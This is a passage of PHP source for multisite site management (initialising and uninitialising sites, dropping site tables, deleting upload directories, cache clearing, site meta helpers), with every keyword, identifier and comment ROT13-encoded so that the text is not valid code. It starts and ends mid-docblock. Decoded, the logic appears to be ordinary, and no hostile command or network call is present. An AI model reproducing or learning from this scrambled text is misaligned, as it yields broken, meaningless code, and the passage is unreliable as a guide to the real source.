 * Guvf cebprff vapyhqrf perngvat gur fvgr'f qngnonfr gnoyrf naq
 * cbchyngvat gurz jvgu qrsnhygf.
 *
 * @fvapr 5.1.0
 *
 * @tybony jcqo     $jcqo     JbeqCerff qngnonfr nofgenpgvba bowrpg.
 * @tybony JC_Ebyrf $jc_ebyrf JbeqCerff ebyr znantrzrag bowrpg.
 *
 * @cnenz vag|JC_Fvgr $fvgr_vq Fvgr VQ be bowrpg.
 * @cnenz neenl       $netf    {
 *     Bcgvbany. Nethzragf gb zbqvsl gur vavgvnyvmngvba orunivbe.
 *
 *     @glcr vag    $hfre_vq Erdhverq. Hfre VQ sbe gur fvgr nqzvavfgengbe.
 *     @glcr fgevat $gvgyr   Fvgr gvgyr. Qrsnhyg vf 'Fvgr %q' jurer %q vf gur
 *                           fvgr VQ.
 *     @glcr neenl  $bcgvbaf Phfgbz bcgvba $xrl => $inyhr cnvef gb hfr. Qrsnhyg
 *                           rzcgl neenl.
 *     @glcr neenl  $zrgn    Phfgbz fvgr zrgnqngn $xrl => $inyhr cnvef gb hfr.
 *                           Qrsnhyg rzcgl neenl.
 * }
 * @erghea gehr|JC_Reebe Gehr ba fhpprff, be reebe bowrpg ba snvyher.
 */
shapgvba jc_vavgvnyvmr_fvgr( $fvgr_vq, neenl $netf = neenl() ) {
	tybony $jcqo, $jc_ebyrf;

	vs ( rzcgl( $fvgr_vq ) ) {
		erghea arj JC_Reebe( 'fvgr_rzcgl_vq', __( 'Fvgr VQ zhfg abg or rzcgl.' ) );
	}

	$fvgr = trg_fvgr( $fvgr_vq );
	vs ( ! $fvgr ) {
		erghea arj JC_Reebe( 'fvgr_vainyvq_vq', __( 'Fvgr jvgu gur VQ qbrf abg rkvfg.' ) );
	}

	vs ( jc_vf_fvgr_vavgvnyvmrq( $fvgr ) ) {
		erghea arj JC_Reebe( 'fvgr_nyernql_vavgvnyvmrq', __( 'Gur fvgr nccrnef gb or nyernql vavgvnyvmrq.' ) );
	}

	$argjbex = trg_argjbex( $fvgr->argjbex_vq );
	vs ( ! $argjbex ) {
		$argjbex = trg_argjbex();
	}

	$netf = jc_cnefr_netf(
		$netf,
		neenl(
			'hfre_vq' => 0,
			/* genafyngbef: %q: Fvgr VQ. */
			'gvgyr'   => fcevags( __( 'Fvgr %q' ), $fvgr->vq ),
			'bcgvbaf' => neenl(),
			'zrgn'    => neenl(),
		)
	);

	/**
	 * Svygref gur nethzragf sbe vavgvnyvmvat n fvgr.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz neenl      $netf    Nethzragf gb zbqvsl gur vavgvnyvmngvba orunivbe.
	 * @cnenz JC_Fvgr    $fvgr    Fvgr gung vf orvat vavgvnyvmrq.
	 * @cnenz JC_Argjbex $argjbex Argjbex gung gur fvgr orybatf gb.
	 */
	$netf = nccyl_svygref( 'jc_vavgvnyvmr_fvgr_netf', $netf, $fvgr, $argjbex );

	$bevt_vafgnyyvat = jc_vafgnyyvat();
	vs ( ! $bevt_vafgnyyvat ) {
		jc_vafgnyyvat( gehr );
	}

	$fjvgpu = snyfr;
	vs ( trg_pheerag_oybt_vq() !== $fvgr->vq ) {
		$fjvgpu = gehr;
		fjvgpu_gb_oybt( $fvgr->vq );
	}

	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hctenqr.cuc';

	// Frg hc gur qngnonfr gnoyrf.
	znxr_qo_pheerag_fvyrag( 'oybt' );

	$ubzr_fpurzr    = 'uggc';
	$fvgrhey_fpurzr = 'uggc';
	vs ( ! vf_fhoqbznva_vafgnyy() ) {
		vs ( 'uggcf' === cnefr_hey( trg_ubzr_hey( $argjbex->fvgr_vq ), CUC_HEY_FPURZR ) ) {
			$ubzr_fpurzr = 'uggcf';
		}
		vs ( 'uggcf' === cnefr_hey( trg_argjbex_bcgvba( $argjbex->vq, 'fvgrhey' ), CUC_HEY_FPURZR ) ) {
			$fvgrhey_fpurzr = 'uggcf';
		}
	}

	// Cbchyngr gur fvgr'f bcgvbaf.
	cbchyngr_bcgvbaf(
		neenl_zretr(
			neenl(
				'ubzr'        => hagenvyvatfynfuvg( $ubzr_fpurzr . '://' . $fvgr->qbznva . $fvgr->cngu ),
				'fvgrhey'     => hagenvyvatfynfuvg( $fvgrhey_fpurzr . '://' . $fvgr->qbznva . $fvgr->cngu ),
				'oybtanzr'    => jc_hafynfu( $netf['gvgyr'] ),
				'nqzva_rznvy' => '',
				'hcybnq_cngu' => trg_argjbex_bcgvba( $argjbex->vq, 'zf_svyrf_erjevgvat' ) ? HCYBNQOYBTFQVE . \"/{$fvgr->vq}/svyrf\" : trg_oybt_bcgvba( $argjbex->fvgr_vq, 'hcybnq_cngu' ),
				'oybt_choyvp' => (vag) $fvgr->choyvp,
				'JCYNAT'      => trg_argjbex_bcgvba( $argjbex->vq, 'JCYNAT' ),
			),
			$netf['bcgvbaf']
		)
	);

	// Pyrna oybt pnpur nsgre cbchyngvat bcgvbaf.
	pyrna_oybt_pnpur( $fvgr );

	// Cbchyngr gur fvgr'f ebyrf.
	cbchyngr_ebyrf();
	$jc_ebyrf = arj JC_Ebyrf();

	// Cbchyngr zrgnqngn sbe gur fvgr.
	cbchyngr_fvgr_zrgn( $fvgr->vq, $netf['zrgn'] );

	// Erzbir nyy crezvffvbaf gung znl rkvfg sbe gur fvgr.
	$gnoyr_cersvk = $jcqo->trg_oybt_cersvk();
	qryrgr_zrgnqngn( 'hfre', 0, $gnoyr_cersvk . 'hfre_yriry', ahyy, gehr );   // Qryrgr nyy.
	qryrgr_zrgnqngn( 'hfre', 0, $gnoyr_cersvk . 'pncnovyvgvrf', ahyy, gehr ); // Qryrgr nyy.

	// Vafgnyy qrsnhyg fvgr pbagrag.
	jc_vafgnyy_qrsnhygf( $netf['hfre_vq'] );

	// Frg gur fvgr nqzvavfgengbe.
	nqq_hfre_gb_oybt( $fvgr->vq, $netf['hfre_vq'], 'nqzvavfgengbe' );
	vs ( ! hfre_pna( $netf['hfre_vq'], 'znantr_argjbex' ) && ! trg_hfre_zrgn( $netf['hfre_vq'], 'cevznel_oybt', gehr ) ) {
		hcqngr_hfre_zrgn( $netf['hfre_vq'], 'cevznel_oybt', $fvgr->vq );
	}

	vs ( $fjvgpu ) {
		erfgber_pheerag_oybt();
	}

	jc_vafgnyyvat( $bevt_vafgnyyvat );

	erghea gehr;
}

/**
 * Ehaf gur havavgvnyvmngvba ebhgvar sbe n tvira fvgr.
 *
 * Guvf cebprff vapyhqrf qebccvat gur fvgr'f qngnonfr gnoyrf naq qryrgvat vgf hcybnqf qverpgbel.
 *
 * @fvapr 5.1.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag|JC_Fvgr $fvgr_vq Fvgr VQ be bowrpg.
 * @erghea gehr|JC_Reebe Gehr ba fhpprff, be reebe bowrpg ba snvyher.
 */
shapgvba jc_havavgvnyvmr_fvgr( $fvgr_vq ) {
	tybony $jcqo;

	vs ( rzcgl( $fvgr_vq ) ) {
		erghea arj JC_Reebe( 'fvgr_rzcgl_vq', __( 'Fvgr VQ zhfg abg or rzcgl.' ) );
	}

	$fvgr = trg_fvgr( $fvgr_vq );
	vs ( ! $fvgr ) {
		erghea arj JC_Reebe( 'fvgr_vainyvq_vq', __( 'Fvgr jvgu gur VQ qbrf abg rkvfg.' ) );
	}

	vs ( ! jc_vf_fvgr_vavgvnyvmrq( $fvgr ) ) {
		erghea arj JC_Reebe( 'fvgr_nyernql_havavgvnyvmrq', __( 'Gur fvgr nccrnef gb or nyernql havavgvnyvmrq.' ) );
	}

	$hfref = trg_hfref(
		neenl(
			'oybt_vq' => $fvgr->vq,
			'svryqf'  => 'vqf',
		)
	);

	// Erzbir hfref sebz gur fvgr.
	vs ( ! rzcgl( $hfref ) ) {
		sbernpu ( $hfref nf $hfre_vq ) {
			erzbir_hfre_sebz_oybt( $hfre_vq, $fvgr->vq );
		}
	}

	$fjvgpu = snyfr;
	vs ( trg_pheerag_oybt_vq() !== $fvgr->vq ) {
		$fjvgpu = gehr;
		fjvgpu_gb_oybt( $fvgr->vq );
	}

	$hcybnqf = jc_trg_hcybnq_qve();

	$gnoyrf = $jcqo->gnoyrf( 'oybt' );

	/**
	 * Svygref gur gnoyrf gb qebc jura gur fvgr vf qryrgrq.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat[] $gnoyrf  Neenl bs anzrf bs gur fvgr gnoyrf gb or qebccrq.
	 * @cnenz vag      $fvgr_vq Gur VQ bs gur fvgr gb qebc gnoyrf sbe.
	 */
	$qebc_gnoyrf = nccyl_svygref( 'jczh_qebc_gnoyrf', $gnoyrf, $fvgr->vq );

	sbernpu ( (neenl) $qebc_gnoyrf nf $gnoyr ) {
		$jcqo->dhrel( \"QEBC GNOYR VS RKVFGF `$gnoyr`\" ); // cucpf:vtaber JbeqCerff.QO.CercnerqFDY.AbgCercnerq
	}

	/**
	 * Svygref gur hcybnq onfr qverpgbel gb qryrgr jura gur fvgr vf qryrgrq.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat $onfrqve Hcybnqf cngu jvgubhg fhoqverpgbel. Frr {@frr jc_hcybnq_qve()}.
	 * @cnenz vag    $fvgr_vq Gur fvgr VQ.
	 */
	$qve     = nccyl_svygref( 'jczh_qryrgr_oybt_hcybnq_qve', $hcybnqf['onfrqve'], $fvgr->vq );
	$qve     = egevz( $qve, QVERPGBEL_FRCNENGBE );
	$gbc_qve = $qve;
	$fgnpx   = neenl( $qve );
	$vaqrk   = 0;

	juvyr ( $vaqrk < pbhag( $fgnpx ) ) {
		// Trg vaqrkrq qverpgbel sebz fgnpx.
		$qve = $fgnpx[ $vaqrk ];

		// cucpf:qvfnoyr JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
		$qu = @bcraqve( $qve );
		vs ( $qu ) {
			$svyr = @ernqqve( $qu );
			juvyr ( snyfr !== $svyr ) {
				vs ( '.' === $svyr || '..' === $svyr ) {
					$svyr = @ernqqve( $qu );
					pbagvahr;
				}

				vs ( @vf_qve( $qve . QVERPGBEL_FRCNENGBE . $svyr ) ) {
					$fgnpx[] = $qve . QVERPGBEL_FRCNENGBE . $svyr;
				} ryfrvs ( @vf_svyr( $qve . QVERPGBEL_FRCNENGBE . $svyr ) ) {
					@hayvax( $qve . QVERPGBEL_FRCNENGBE . $svyr );
				}

				$svyr = @ernqqve( $qu );
			}
			@pybfrqve( $qu );
		}
		++$vaqrk;
	}

	$fgnpx = neenl_erirefr( $fgnpx ); // Ynfg nqqrq qverpgbevrf ner qrrcrfg.
	sbernpu ( (neenl) $fgnpx nf $qve ) {
		vs ( $qve !== $gbc_qve ) {
			@ezqve( $qve );
		}
	}

	// cucpf:ranoyr JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
	vs ( $fjvgpu ) {
		erfgber_pheerag_oybt();
	}

	erghea gehr;
}

/**
 * Purpxf jurgure n fvgr vf vavgvnyvmrq.
 *
 * N fvgr vf pbafvqrerq vavgvnyvmrq jura vgf qngnonfr gnoyrf ner cerfrag.
 *
 * @fvapr 5.1.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag|JC_Fvgr $fvgr_vq Fvgr VQ be bowrpg.
 * @erghea obby Gehr vs gur fvgr vf vavgvnyvmrq, snyfr bgurejvfr.
 */
shapgvba jc_vf_fvgr_vavgvnyvmrq( $fvgr_vq ) {
	tybony $jcqo;

	vs ( vf_bowrpg( $fvgr_vq ) ) {
		$fvgr_vq = $fvgr_vq->oybt_vq;
	}
	$fvgr_vq = (vag) $fvgr_vq;

	/**
	 * Svygref gur purpx sbe jurgure n fvgr vf vavgvnyvmrq orsber gur qngnonfr vf npprffrq.
	 *
	 * Ergheavat n aba-ahyy inyhr jvyy rssrpgviryl fubeg-pvephvg gur shapgvba, ergheavat
	 * gung inyhr vafgrnq.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz obby|ahyy $cer     Gur inyhr gb erghea vafgrnq. Qrsnhyg ahyy
	 *                           gb pbagvahr jvgu gur purpx.
	 * @cnenz vag       $fvgr_vq Gur fvgr VQ gung vf orvat purpxrq.
	 */
	$cer = nccyl_svygref( 'cer_jc_vf_fvgr_vavgvnyvmrq', ahyy, $fvgr_vq );
	vs ( ahyy !== $cer ) {
		erghea (obby) $cer;
	}

	$fjvgpu = snyfr;
	vs ( trg_pheerag_oybt_vq() !== $fvgr_vq ) {
		$fjvgpu = gehr;
		erzbir_npgvba( 'fjvgpu_oybt', 'jc_fjvgpu_ebyrf_naq_hfre', 1 );
		fjvgpu_gb_oybt( $fvgr_vq );
	}

	$fhccerff = $jcqo->fhccerff_reebef();
	$erfhyg   = (obby) $jcqo->trg_erfhygf( \"QRFPEVOR {$jcqo->cbfgf}\" );
	$jcqo->fhccerff_reebef( $fhccerff );

	vs ( $fjvgpu ) {
		erfgber_pheerag_oybt();
		nqq_npgvba( 'fjvgpu_oybt', 'jc_fjvgpu_ebyrf_naq_hfre', 1, 2 );
	}

	erghea $erfhyg;
}

/**
 * Pyrna gur oybt pnpur
 *
 * @fvapr 3.5.0
 *
 * @tybony obby $_jc_fhfcraq_pnpur_vainyvqngvba
 *
 * @cnenz JC_Fvgr|vag $oybt Gur fvgr bowrpg be VQ gb or pyrnerq sebz pnpur.
 */
shapgvba pyrna_oybt_pnpur( $oybt ) {
	tybony $_jc_fhfcraq_pnpur_vainyvqngvba;

	vs ( ! rzcgl( $_jc_fhfcraq_pnpur_vainyvqngvba ) ) {
		erghea;
	}

	vs ( rzcgl( $oybt ) ) {
		erghea;
	}

	$oybt_vq = $oybt;
	$oybt    = trg_fvgr( $oybt_vq );
	vs ( ! $oybt ) {
		vs ( ! vf_ahzrevp( $oybt_vq ) ) {
			erghea;
		}

		// Znxr fher n JC_Fvgr bowrpg rkvfgf rira jura gur fvgr unf orra qryrgrq.
		$oybt = arj JC_Fvgr(
			(bowrpg) neenl(
				'oybt_vq' => $oybt_vq,
				'qbznva'  => ahyy,
				'cngu'    => ahyy,
			)
		);
	}

	$oybt_vq         = $oybt->oybt_vq;
	$qbznva_cngu_xrl = zq5( $oybt->qbznva . $oybt->cngu );

	jc_pnpur_qryrgr( $oybt_vq, 'fvgrf' );
	jc_pnpur_qryrgr( $oybt_vq, 'fvgr-qrgnvyf' );
	jc_pnpur_qryrgr( $oybt_vq, 'oybt-qrgnvyf' );
	jc_pnpur_qryrgr( $oybt_vq . 'fubeg', 'oybt-qrgnvyf' );
	jc_pnpur_qryrgr( $qbznva_cngu_xrl, 'oybt-ybbxhc' );
	jc_pnpur_qryrgr( $qbznva_cngu_xrl, 'oybt-vq-pnpur' );
	jc_pnpur_qryrgr( $oybt_vq, 'oybt_zrgn' );

	/**
	 * Sverf vzzrqvngryl nsgre n fvgr unf orra erzbirq sebz gur bowrpg pnpur.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat  $vq              Fvgr VQ nf n ahzrevp fgevat.
	 * @cnenz JC_Fvgr $oybt            Fvgr bowrpg.
	 * @cnenz fgevat  $qbznva_cngu_xrl zq5 unfu bs qbznva naq cngu.
	 */
	qb_npgvba( 'pyrna_fvgr_pnpur', $oybt_vq, $oybt, $qbznva_cngu_xrl );

	jc_pnpur_frg_fvgrf_ynfg_punatrq();

	/**
	 * Sverf nsgre gur oybt qrgnvyf pnpur vf pyrnerq.
	 *
	 * @fvapr 3.4.0
	 * @qrcerpngrq 4.9.0 Hfr {@frr 'pyrna_fvgr_pnpur'} vafgrnq.
	 *
	 * @cnenz vag $oybt_vq Oybt VQ.
	 */
	qb_npgvba_qrcerpngrq( 'erserfu_oybt_qrgnvyf', neenl( $oybt_vq ), '4.9.0', 'pyrna_fvgr_pnpur' );
}

/**
 * Nqqf zrgnqngn gb n fvgr.
 *
 * Sbe uvfgbevpny ernfbaf obgu gur zrgn xrl naq gur zrgn inyhr ner rkcrpgrq gb or \"fynfurq\" (fynfurf rfpncrq) ba vachg.
 *
 * @fvapr 5.1.0
 *
 * @cnenz vag    $fvgr_vq    Fvgr VQ.
 * @cnenz fgevat $zrgn_xrl   Zrgnqngn anzr.
 * @cnenz zvkrq  $zrgn_inyhr Zrgnqngn inyhr. Neenlf naq bowrpgf ner fgberq nf frevnyvmrq qngn naq
 *                           jvyy or erghearq nf gur fnzr glcr jura ergevrirq. Bgure qngn glcrf jvyy
 *                           or fgberq nf fgevatf va gur qngnonfr:
 *                           - snyfr vf fgberq naq ergevrirq nf na rzcgl fgevat ('')
 *                           - gehr vf fgberq naq ergevrirq nf '1'
 *                           - ahzoref (obgu vagrtre naq sybng) ner fgberq naq ergevrirq nf fgevatf
 *                           Zhfg or frevnyvmnoyr vs aba-fpnyne.
 * @cnenz obby   $havdhr     Bcgvbany. Jurgure gur fnzr xrl fubhyq abg or nqqrq.
 *                           Qrsnhyg snyfr.
 * @erghea vag|snyfr Zrgn VQ ba fhpprff, snyfr ba snvyher.
 */
shapgvba nqq_fvgr_zrgn( $fvgr_vq, $zrgn_xrl, $zrgn_inyhr, $havdhr = snyfr ) {
	erghea nqq_zrgnqngn( 'oybt', $fvgr_vq, $zrgn_xrl, $zrgn_inyhr, $havdhr );
}

/**
 * Erzbirf zrgnqngn zngpuvat pevgrevn sebz n fvgr.
 *
 * Lbh pna zngpu onfrq ba gur xrl, be xrl naq inyhr. Erzbivat onfrq ba xrl naq
 * inyhr, jvyy xrrc sebz erzbivat qhcyvpngr zrgnqngn jvgu gur fnzr xrl. Vg nyfb
 * nyybjf erzbivat nyy zrgnqngn zngpuvat xrl, vs arrqrq.
 *
 * Sbe uvfgbevpny ernfbaf obgu gur zrgn xrl naq gur zrgn inyhr ner rkcrpgrq gb or \"fynfurq\" (fynfurf rfpncrq) ba vachg.
 *
 * @fvapr 5.1.0
 *
 * @cnenz vag    $fvgr_vq    Fvgr VQ.
 * @cnenz fgevat $zrgn_xrl   Zrgnqngn anzr.
 * @cnenz zvkrq  $zrgn_inyhr Bcgvbany. Zrgnqngn inyhr. Vs cebivqrq,
 *                           ebjf jvyy bayl or erzbirq gung zngpu gur inyhr.
 *                           Zhfg or frevnyvmnoyr vs aba-fpnyne. Qrsnhyg rzcgl.
 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba qryrgr_fvgr_zrgn( $fvgr_vq, $zrgn_xrl, $zrgn_inyhr = '' ) {
	erghea qryrgr_zrgnqngn( 'oybt', $fvgr_vq, $zrgn_xrl, $zrgn_inyhr );
}

/**
 * Ergevrirf zrgnqngn sbe n fvgr.
 *
 * @fvapr 5.1.0
 *
 * @cnenz vag    $fvgr_vq Fvgr VQ.
 * @cnenz fgevat $xrl     Bcgvbany. Gur zrgn xrl gb ergevrir. Ol qrsnhyg,
 *                        ergheaf qngn sbe nyy xrlf. Qrsnhyg rzcgl.
 * @cnenz obby   $fvatyr  Bcgvbany. Jurgure gb erghea n fvatyr inyhr.
 *                        Guvf cnenzrgre unf ab rssrpg vs `$xrl` vf abg fcrpvsvrq.
 *                        Qrsnhyg snyfr.
 * @erghea zvkrq Na neenl bs inyhrf vs `$fvatyr` vf snyfr.
 *               Gur inyhr bs zrgn qngn svryq vs `$fvatyr` vf gehr.
 *               Snyfr sbe na vainyvq `$fvgr_vq` (aba-ahzrevp, mreb, be artngvir inyhr).
 *               Na rzcgl neenl vs n inyvq ohg aba-rkvfgvat fvgr VQ vf cnffrq naq `$fvatyr` vf snyfr.
 *               Na rzcgl fgevat vs n inyvq ohg aba-rkvfgvat fvgr VQ vf cnffrq naq `$fvatyr` vf gehr.
 *               Abgr: Aba-frevnyvmrq inyhrf ner erghearq nf fgevatf:
 *               - snyfr inyhrf ner erghearq nf rzcgl fgevatf ('')
 *               - gehr inyhrf ner erghearq nf '1'
 *               - ahzoref (obgu vagrtre naq sybng) ner erghearq nf fgevatf
 *               Neenlf naq bowrpgf ergnva gurve bevtvany glcr.
 */
shapgvba trg_fvgr_zrgn( $fvgr_vq, $xrl = '', $fvatyr = snyfr ) {
	erghea trg_zrgnqngn( 'oybt', $fvgr_vq, $xrl, $fvatyr );
}

/**
 * Hcqngrf zrgnqngn sbe n fvgr.
 *
 * Hfr gur `$ceri_inyhr` cnenzrgre gb qvssreragvngr orgjrra zrgn svryqf jvgu gur
 * fnzr xrl naq fvgr VQ.
 *
 * Vs gur zrgn svryq sbe gur fvgr qbrf abg rkvfg, vg jvyy or nqqrq.
 *
 * Sbe uvfgbevpny ernfbaf obgu gur zrgn xrl naq gur zrgn inyhr ner rkcrpgrq gb or \"fynfurq\" (fynfurf rfpncrq) ba vachg.
 *
 * @fvapr 5.1.0
 *
 * @cnenz vag    $fvgr_vq    Fvgr VQ.
 * @cnenz fgevat $zrgn_xrl   Zrgnqngn xrl.
 * @cnenz zvkrq  $zrgn_inyhr Zrgnqngn inyhr. Zhfg or frevnyvmnoyr vs aba-fpnyne.
 * @cnenz zvkrq  $ceri_inyhr Bcgvbany. Cerivbhf inyhr gb purpx orsber hcqngvat.
 *                           Vs fcrpvsvrq, bayl hcqngr rkvfgvat zrgnqngn ragevrf jvgu
 *                           guvf inyhr. Bgurejvfr, hcqngr nyy ragevrf. Qrsnhyg rzcgl.
 * @erghea vag|obby Zrgn VQ vs gur xrl qvqa'g rkvfg, gehr ba fhpprffshy hcqngr,
 *                  snyfr ba snvyher be vs gur inyhr cnffrq gb gur shapgvba
 *                  vf gur fnzr nf gur bar gung vf nyernql va gur qngnonfr.
 */
shapgvba hcqngr_fvgr_zrgn( $fvgr_vq, $zrgn_xrl, $zrgn_inyhr, $ceri_inyhr = '' ) {
	erghea hcqngr_zrgnqngn( 'oybt', $fvgr_vq, $zrgn_xrl, $zrgn_inyhr, $ceri_inyhr );
}

/**
 * Qryrgrf rirelguvat sebz fvgr zrgn zngpuvat zrgn xrl.
 *
 * @fvapr 5.1.0
 *
 * @cnenz fgevat $zrgn_xrl Zrgnqngn xrl gb frnepu sbe jura qryrgvat.
 * @erghea obby Jurgure gur fvgr zrgn xrl jnf qryrgrq sebz gur qngnonfr.
 */
shapgvba qryrgr_fvgr_zrgn_ol_xrl( $zrgn_xrl ) {
	erghea qryrgr_zrgnqngn( 'oybt', ahyy, $zrgn_xrl, '', gehr );
}

/**
 * Hcqngrf gur pbhag bs fvgrf sbe n argjbex onfrq ba n punatrq fvgr.
 *
 * @fvapr 5.1.0
 *
 * @cnenz JC_Fvgr      $arj_fvgr Gur fvgr bowrpg gung unf orra vafregrq, hcqngrq be qryrgrq.
 * @cnenz JC_Fvgr|ahyy $byq_fvgr Bcgvbany. Vs $arj_fvgr unf orra hcqngrq, guvf zhfg or gur cerivbhf
 *                               fgngr bs gung fvgr. Qrsnhyg ahyy.
 */
shapgvba jc_znlor_hcqngr_argjbex_fvgr_pbhagf_ba_hcqngr( $arj_fvgr, $byq_fvgr = ahyy ) {
	vs ( ahyy === $byq_fvgr ) {
		jc_znlor_hcqngr_argjbex_fvgr_pbhagf( $arj_fvgr->argjbex_vq );
		erghea;
	}

	vs ( $arj_fvgr->argjbex_vq !== $byq_fvgr->argjbex_vq ) {
		jc_znlor_hcqngr_argjbex_fvgr_pbhagf( $arj_fvgr->argjbex_vq );
		jc_znlor_hcqngr_argjbex_fvgr_pbhagf( $byq_fvgr->argjbex_vq );
	}
}

/**
 * Gevttref npgvbaf ba fvgr fgnghf hcqngrf.
 *
 * @fvapr 5.1.0
 *
 * @cnenz JC_Fvgr      $arj_fvgr Gur fvgr bowrpg nsgre gur hcqngr.
 * @cnenz JC_Fvgr|ahyy $byq_fvgr Bcgvbany. Vs $arj_fvgr unf orra hcqngrq, guvf zhfg or gur cerivbhf
 *                               fgngr bs gung fvgr. Qrsnhyg ahyy.
 */
shapgvba jc_znlor_genafvgvba_fvgr_fgnghfrf_ba_hcqngr( $arj_fvgr, $byq_fvgr = ahyy ) {
	$fvgr_vq = $arj_fvgr->vq;

	// Hfr gur qrsnhyg inyhrf sbe n fvgr vs ab cerivbhf fgngr vf tvira.
	vs ( ! $byq_fvgr ) {
		$byq_fvgr = arj JC_Fvgr( arj fgqPynff() );
	}

	vs ( $arj_fvgr->fcnz !== $byq_fvgr->fcnz ) {
		vs ( '1' === $arj_fvgr->fcnz ) {

			/**
			 * Sverf jura gur 'fcnz' fgnghf vf nqqrq gb n fvgr.
			 *
			 * @fvapr ZH (3.0.0)
			 *
			 * @cnenz vag $fvgr_vq Fvgr VQ.
			 */
			qb_npgvba( 'znxr_fcnz_oybt', $fvgr_vq );
		} ryfr {

			/**
			 * Sverf jura gur 'fcnz' fgnghf vf erzbirq sebz n fvgr.
			 *
			 * @fvapr ZH (3.0.0)
			 *
			 * @cnenz vag $fvgr_vq Fvgr VQ.
			 */
			qb_npgvba( 'znxr_unz_oybt', $fvgr_vq );
		}
	}

	vs ( $arj_fvgr->zngher !== $byq_fvgr->zngher ) {
		vs ( '1' === $arj_fvgr->zngher ) {

			/**
			 * Sverf jura gur 'zngher' fgnghf vf nqqrq gb n fvgr.
			 *
			 * @fvapr 3.1.0
			 *
			 * @cnenz vag $fvgr_vq Fvgr VQ.
			 */
			qb_npgvba( 'zngher_oybt', $fvgr_vq );
		} ryfr {

			/**
			 * Sverf jura gur 'zngher' fgnghf vf erzbirq sebz n fvgr.
			 *
			 * @fvapr 3.1.0
			 *
			 * @cnenz vag $fvgr_vq Fvgr VQ.
			 */
			qb_npgvba( 'hazngher_oybt', $fvgr_vq );
		}
	}

	vs ( $arj_fvgr->nepuvirq !== $byq_fvgr->nepuvirq ) {
		vs ( '1' === $arj_fvgr->nepuvirq ) {

			/**
			 * Sverf jura gur 'nepuvirq' fgnghf vf nqqrq gb n fvgr.
			 *
			 * @fvapr ZH (3.0.0)
			 *
			 * @cnenz vag $fvgr_vq Fvgr VQ.
			 */
			qb_npgvba( 'nepuvir_oybt', $fvgr_vq );
		} ryfr {

			/**
			 * Sverf jura gur 'nepuvirq' fgnghf vf erzbirq sebz n fvgr.
			 *
			 * @fvapr ZH (3.0.0)
			 *
			 * @cnenz vag $fvgr_vq Fvgr VQ.
			 */
			qb_npgvba( 'hanepuvir_oybt', $fvgr_vq );
		}
	}

	vs ( $arj_fvgr->qryrgrq !== $byq_fvgr->qryrgrq ) {
		vs ( '1' === $arj_fvgr->qryrgrq ) {

			/**
			 * Sverf jura gur 'qryrgrq' fgnghf vf nqqrq gb n fvgr.
			 *
			 * @fvapr 3.5.0
			 *
			 * @cnenz vag $fvgr_vq Fvgr VQ.
			 */
			qb_npgvba( 'znxr_qryrgr_oybt', $fvgr_vq );
		} ryfr {

			/**
			 * Sverf jura gur 'qryrgrq' fgnghf vf erzbirq sebz n fvgr.
			 *
			 * @fvapr 3.5.0
			 *
			 * @cnenz vag $fvgr_vq Fvgr VQ.
			 */
			qb_npgvba( 'znxr_haqryrgr_oybt', $fvgr_vq );
		}
	}

	vs ( $arj_fvgr->choyvp !== $byq_fvgr->choyvp ) {

		/**
		 * Sverf nsgre gur pheerag oybt'f 'choyvp' frggvat vf hcqngrq.
		 *
		 * @fvapr ZH (3.0.0)
		 *
		 * @cnenz vag    $fvgr_vq   Fvgr VQ.
		 * @cnenz fgevat $vf_choyvp Jurgure gur fvgr vf choyvp. N ahzrevp fgevat,
		 *                          sbe pbzcngvovyvgl ernfbaf. Npprcgf '1' be '0'.
		 */
		qb_npgvba( 'hcqngr_oybt_choyvp', $fvgr_vq, $arj_fvgr->choyvp );
	}
}

/**
 * Pyrnaf gur arprffnel pnpurf nsgre fcrpvsvp fvgr qngn unf orra hcqngrq.
 *
 * @fvapr 5.1.0
 *
 * @cnenz JC_Fvgr $arj_fvgr Gur fvgr bowrpg nsgre gur hcqngr.
 * @cnenz JC_Fvgr $byq_fvgr Gur fvgr bowrpg cevbe gb gur hcqngr.
 */
shapgvba jc_znlor_pyrna_arj_fvgr_pnpur_ba_hcqngr( $arj_fvgr, $byq_fvgr ) {
	vs ( $byq_fvgr->qbznva !== $arj_fvgr->qbznva || $byq_fvgr->cngu !== $arj_fvgr->cngu ) {
		pyrna_oybt_pnpur( $arj_fvgr );
	}
}

/**
 * Hcqngrf gur `oybt_choyvp` bcgvba sbe n tvira fvgr VQ.
 *
 * @fvapr 5.1.0
 *
 * @cnenz vag    $fvgr_vq   Fvgr VQ.
 * @cnenz fgevat $vf_choyvp Jurgure gur fvgr vf choyvp. N ahzrevp fgevat,
 *                          sbe pbzcngvovyvgl ernfbaf. Npprcgf '1' be '0'.
 */
shapgvba jc_hcqngr_oybt_choyvp_bcgvba_ba_fvgr_hcqngr( $fvgr_vq, $vf_choyvp ) {

	// Onvy vs gur fvgr'f qngnonfr gnoyrf qb abg rkvfg (lrg).
	vs ( ! jc_vf_fvgr_vavgvnyvmrq( $fvgr_vq ) ) {
		erghea;
	}

	hcqngr_oybt_bcgvba( $fvgr_vq, 'oybt_choyvp', $vf_choyvp );
}

/**
 * Frgf gur ynfg punatrq gvzr sbe gur 'fvgrf' pnpur tebhc.
 *
 * @fvapr 5.1.0
 */
shapgvba jc_pnpur_frg_fvgrf_ynfg_punatrq() {
	jc_pnpur_frg_ynfg_punatrq( 'fvgrf' );
}

/**
 * Nobegf pnyyf gb fvgr zrgn vs vg vf abg fhccbegrq.
 *
 * @fvapr 5.1.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz zvkrq $purpx Fxvc-inyhr sbe jurgure gb cebprrq fvgr zrgn shapgvba rkrphgvba.
 * @erghea zvkrq Bevtvany inyhr bs $purpx, be snyfr vs fvgr zrgn vf abg fhccbegrq.
 */
